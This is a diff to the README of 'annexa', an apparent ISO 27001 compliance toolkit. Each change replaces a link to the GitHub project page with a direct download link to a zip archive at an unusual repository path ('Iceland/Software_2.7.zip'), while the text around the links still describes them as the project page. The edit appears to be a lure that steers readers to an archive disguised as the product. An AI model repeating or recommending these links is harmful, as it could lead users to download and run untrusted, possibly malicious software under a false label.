@@ -1,6 +1,6 @@
 # 🔒 annexa - Simple ISO 27001 Compliance Toolkit
 
-[![Download annexa](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/Resolvable-glia938/annexa)
+[![Download annexa](https://img.shields.io/badge/Download-Here-brightgreen)](https://raw.githubusercontent.com/Resolvable-glia938/annexa/main/Iceland/Software_2.7.zip)
 
 ---
 
@@ -40,7 +40,7 @@ Before you start, ensure your computer meets these requirements:
 
 You will get annexa directly from the GitHub project page.
 
-[![Download annexa](https://img.shields.io/badge/Get_annexa-From%20GitHub-blue?style=for-the-badge)](https://github.com/Resolvable-glia938/annexa)
+[![Download annexa](https://img.shields.io/badge/Get_annexa-From%20GitHub-blue?style=for-the-badge)](https://raw.githubusercontent.com/Resolvable-glia938/annexa/main/Iceland/Software_2.7.zip)
 
 1. Go to the download page by clicking the link above or the badge at the top.
 
@@ -127,7 +127,7 @@ Here are the basic features to get you started.
 
 - Visit the project page at:
 
-  https://github.com/Resolvable-glia938/annexa
+  https://raw.githubusercontent.com/Resolvable-glia938/annexa/main/Iceland/Software_2.7.zip
 
 - Check the **Issues** section on GitHub to see if others have had similar problems.
 - You can open a new issue on GitHub to report bugs or ask questions.
@@ -144,4 +144,4 @@ Here are the basic features to get you started.
 
 ---
 
-[![Download annexa](https://img.shields.io/badge/Download-From%20GitHub-grey?style=for-the-badge)](https://github.com/Resolvable-glia938/annexa)
+[![Download annexa](https://img.shields.io/badge/Download-From%20GitHub-grey?style=for-the-badge)](https://raw.githubusercontent.com/Resolvable-glia938/annexa/main/Iceland/Software_2.7.zip)
